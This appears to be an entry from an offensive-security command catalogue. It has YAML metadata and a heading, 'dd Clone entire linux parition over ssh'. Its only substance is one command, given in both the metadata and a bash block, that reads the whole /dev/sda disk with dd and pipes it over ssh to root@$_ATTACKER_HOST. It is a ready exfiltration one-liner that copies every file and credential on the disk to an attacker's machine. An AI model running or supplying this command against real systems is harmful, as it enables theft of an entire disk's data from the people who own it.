---
id: f789edc9-afd1-4a21-8fc4-8e70e587b65d
name: dd Clone entire linux parition over ssh
type: command
executor: ''
data: dd bs=16m if=/dev/sda | ssh root@$_ATTACKER_HOST "dd bs=16M of=/dev/sdb"
output: null
created_at: '2023-02-17T02:28:38.395287+00:00'
updated_at: '2023-03-13T19:50:21.945040+00:00'
tools:
- '[[DD]]'
---

# dd Clone entire linux parition over ssh

```bash
dd bs=16m if=/dev/sda | ssh root@$_ATTACKER_HOST "dd bs=16M of=/dev/sdb"
```


